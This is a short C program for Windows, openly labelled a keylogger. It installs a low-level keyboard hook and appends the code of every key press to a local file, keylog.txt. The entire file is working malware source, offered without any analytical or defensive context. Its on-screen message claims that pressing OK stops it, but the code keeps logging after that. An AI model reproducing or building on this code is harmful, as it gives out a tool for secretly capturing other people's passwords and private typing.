// This is a keylogger
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

HHOOK hHook = NULL;
FILE *logFile = NULL;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
            DWORD vkCode = p->vkCode;
            logFile = fopen("keylog.txt", "a+");
            if (logFile) {
                fprintf(logFile, "Key: %lu\n", vkCode);
                fclose(logFile);
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    MSG msg;
    HINSTANCE hInstance = GetModuleHandle(NULL);
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    if (!hHook) {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
        return 1;
    }
    MessageBox(NULL, "Keylogger running! Press OK to stop.", "Info", MB_OK);
    while (GetMessage(&msg, NULL, 0, 0) > 0) {}
    UnhookWindowsHookEx(hHook);
    return 0;
}
